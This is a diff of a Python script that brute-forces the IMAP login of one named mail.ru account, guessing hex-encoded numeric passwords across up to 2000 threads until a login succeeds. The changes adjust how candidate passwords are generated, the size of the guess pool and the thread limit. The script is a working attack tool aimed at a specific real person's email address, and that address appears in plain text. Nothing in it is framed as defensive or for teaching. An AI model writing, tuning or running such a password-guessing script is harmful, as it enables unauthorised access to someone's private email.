@@ -6,7 +6,6 @@ import os,requests
 
 found = set()
 pooll = set()
-#sys.exit()
 for n in range(10):
     spns = False
     try :
@@ -34,31 +33,32 @@ def fill_pooll(no):
     except:
         pass
     for x in range(no):
-        line = bcdechex(vase)
-        pooll.add(line)
+        pooll.add(vase)
         vase += 1
         
 def checkin(c):
     global pooll
     global found
     try : 
-        password = random.sample(pooll, 1)[0]
+        pord = random.sample(pooll, 1)[0]
+        password = bcdechex(pord)
         server = imapclient.IMAPClient("imap.mail.ru", port=993, use_uid=True, ssl=True, timeout=20)
         server.login("orazow_1993@mail.ru", password)
         print(" +++ Password found  : %s ", password ) 
         found.add(password)
     except imapclient.exceptions.LoginError:
         if (c-len(pooll)) % 1000 == 0:
-            print("{:,} {:,} {}".format(c,c-len(pooll),password))
-        if password in pooll:
-            pooll.remove(password)
+            print("{:,} {:,} {} {}".format(c,c-len(pooll),password,threading.active_count()))
+        if pord in pooll:
+            pooll.remove(pord)
     except:
         pass
 
+
 while len(found)<1:
     if len(pooll) == 0:
-        fill_pooll(100000)
-    if threading.active_count() < 20024:
+        fill_pooll(50000)
+    if threading.active_count() < 2000:
         threading.Thread(target = checkin , args = (vase,)).start()
 
 
